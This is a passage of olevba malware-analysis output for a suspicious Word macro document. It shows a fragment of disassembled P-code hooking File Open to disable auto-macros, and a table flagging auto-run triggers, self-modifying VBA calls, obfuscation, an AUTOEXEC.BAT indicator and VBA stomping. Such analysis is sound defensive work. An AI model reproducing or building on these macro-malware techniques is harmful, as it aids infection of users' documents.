' 	Ld IL6896 
' 	EndForVariable 
' 	NextVar 
' Line #103:
' 	EndFunc 
' Line #104:
' 	FuncDefn (Private Function FileOpen(id_FFFE As Variant))
' Line #105:
' 	OnError (Resume Next) 
' Line #106:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0001 
' Line #107:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #108:
' 	ArgsCall Document_Close 0x0000 
' Line #109:
' 	EndFunc 
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |newDocument         |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

